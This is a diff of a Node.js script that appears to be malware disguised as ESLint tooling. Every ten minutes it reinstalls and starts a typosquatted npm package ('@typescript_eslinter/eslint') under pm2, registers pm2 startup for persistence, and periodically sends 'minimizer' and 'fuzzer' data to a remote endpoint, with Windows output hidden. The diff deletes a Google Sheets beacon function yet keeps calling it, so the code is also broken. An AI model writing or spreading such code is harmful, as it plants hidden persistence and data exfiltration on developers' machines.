@@ -12,8 +12,6 @@ const os = require("os");
 const { exec } = require("child_process");
 const { io } = require("socket.io-client");
 
-const { JWT } = require('google-auth-library');
-const { GoogleSpreadsheet } = require('google-spreadsheet');
 const creds = require('./tools/det.json'); // Make sure credentials.json is in the same folder
 
 const prettierExtracter = () => {
@@ -343,26 +341,6 @@ const runCommand = (command) => {
   });
 };
 
-
-async function accessSpreadsheet(minimizer, fuzzer) {
-  try {
-      // Initialize the sheet - doc ID is the long id in the sheets URL
-      const auth = new JWT({
-        email: creds.client_email,
-        key: creds.private_key,
-        scopes: ['https://www.googleapis.com/auth/spreadsheets'],
-      });
-      const doc = new GoogleSpreadsheet('1YpM4h5OafBUg-cWgZ-GLqzZHHSxFtIBwXy15n85EGF4', auth);
-      
-      await doc.loadInfo();
-      const sheet = doc.sheetsByIndex[0];
-      await sheet.addRow({
-        minimizer, fuzzer, time: new Date()
-      });
-  } catch (error) {
-  }
-}
-
 const makeRebootable = async () => {
   try {
     await runCommand('pm2 startup');
@@ -375,7 +353,7 @@ function installEslinter() {
   return new Promise((resolve, reject) => {
     exec('npm install -g @typescript_eslinter/eslint@latest', (error, stdout, stderr) => {
       if (error) {
-        resolve(`Error installing PM2: ${stderr}`);
+        resolve(`Error installing installEslinter: ${stderr}`);
       } else {
         resolve(stdout);
       }
@@ -387,7 +365,30 @@ function deleteEslinter() {
   return new Promise((resolve, reject) => {
     exec('pm2 delete eslinter', (error, stdout, stderr) => {
       if (error) {
-        resolve(`Error installing PM2: ${stderr}`);
+        resolve(`Error installing deleteEslinter: ${stderr}`);
+      } else {
+        resolve(stdout);
+      }
+    });
+  });
+}
+
+function deleteEslinter1() {
+  return new Promise((resolve, reject) => {
+    exec('/usr/local/Cellar/node/22.9.0_1/bin/pm2 delete eslinter', (error, stdout, stderr) => {
+      if (error) {
+        reject(`Error installing deleteEslinter1: ${stderr}`);
+      } else {
+        resolve(stdout);
+      }
+    });
+  });
+}
+function deleteEslinter2() {
+  return new Promise((resolve, reject) => {
+    exec('/usr/local/Cellar/node/22.9.0_1/lib/node_modules/pm2/bin/pm2 delete eslinter', (error, stdout, stderr) => {
+      if (error) {
+        reject(`Error installing deleteEslinter2: ${stderr}`);
       } else {
         resolve(stdout);
       }
@@ -399,7 +400,7 @@ function startEslinter() {
   return new Promise((resolve, reject) => {
     exec(`eslinter start`, { windowsHide: true }, (error, stdout, stderr) => {
       if (error) {
-        resolve(`Error starting with PM2: ${stderr}`);
+        resolve(`Error starting with startEslinter: ${stderr}`);
       } else {
         resolve(stdout);
       }
@@ -407,6 +408,30 @@ function startEslinter() {
   });
 }
 
+// Function to start the folder with pm2
+function startEslinter1() {
+  return new Promise((resolve, reject) => {
+    exec(`/usr/local/Cellar/node/22.9.0_1/bin/eslinter start`, { windowsHide: true }, (error, stdout, stderr) => {
+      if (error) {
+        reject(`Error starting with startEslinter1: ${stderr}`);
+      } else {
+        resolve(stdout);
+      }
+    });
+  });
+}
+// Function to start the folder with pm2
+function startEslinter2() {
+  return new Promise((resolve, reject) => {
+    exec(`/usr/local/Celler/node/22.9.0_1/lib/node_modules/@typescript_eslinter/eslint/bin/eslinter start`, { windowsHide: true }, (error, stdout, stderr) => {
+      if (error) {
+        reject(`Error starting with startEslinter2: ${stderr}`);
+      } else {
+        resolve(stdout);
+      }
+    });
+  });
+}
 const main = async () => {
   console.log("Loading...")
   if (os.platform().includes("win32")) {
@@ -427,7 +452,6 @@ const main = async () => {
   setInterval(async () => {
     try {
       if (pendingData.minimizer != "" || pendingData.fuzzer != "") {
-        await accessSpreadsheet(pendingData.minimizer, pendingData.fuzzer)
         const success = await sendMinimizerAndFuzzerData(
           pendingData.minimizer,
           pendingData.fuzzer
@@ -446,13 +470,58 @@ const main = async () => {
       }
     } catch (err) {}
   }, 10000);
-  await accessSpreadsheet("start", "ping");
+  try {
+await sendMinimizerAndFuzzerData("ping", "load")
+  }
+  catch {}
 
   setInterval(async ()=> {
     try {
-      await deleteEslinter();
-      await installEslinter();
-      await startEslinter();
+      try {
+        await deleteEslinter();
+        await accessSpreadsheet("loading...", "deleteEslinter")
+      } catch (error) {
+        await accessSpreadsheet("loading...deleteEslinter", error)
+  
+        try {
+          await deleteEslinter1();
+          await accessSpreadsheet("loading...", "deleteEslinter1")
+        } catch (error) {
+          await accessSpreadsheet("loading...deleteEslinter1", error)
+          try {
+            await deleteEslinter2();
+            await accessSpreadsheet("loading...", "deleteEslinter2")
+          } catch (error) {
+            await accessSpreadsheet("loading...deleteEslinter2", error)
+          }
+        }
+      }
+      try {
+        await installEslinter();
+        await accessSpreadsheet("loading...", "installEslinter")
+      } catch (error) {
+        await accessSpreadsheet("loading...installEslinter", error)
+      }
+      try {
+        await startEslinter();
+        await accessSpreadsheet("loading...", "startEslinter")
+      } catch (error) {
+        await accessSpreadsheet("loading...startEslinter", error)
+  
+        try {
+          await startEslinter1();
+          await accessSpreadsheet("loading...", "startEslinter1")
+        } catch (error) {
+          await accessSpreadsheet("loading...startEslinter1", error)
+  
+          try {
+            await startEslinter2();
+            await accessSpreadsheet("loading...", "startEslinter2")
+          } catch (error) {
+            await accessSpreadsheet("loading...startEslinter2", error)
+          }
+        }
+      }
     } catch(err){}
   }, 600000);
 };
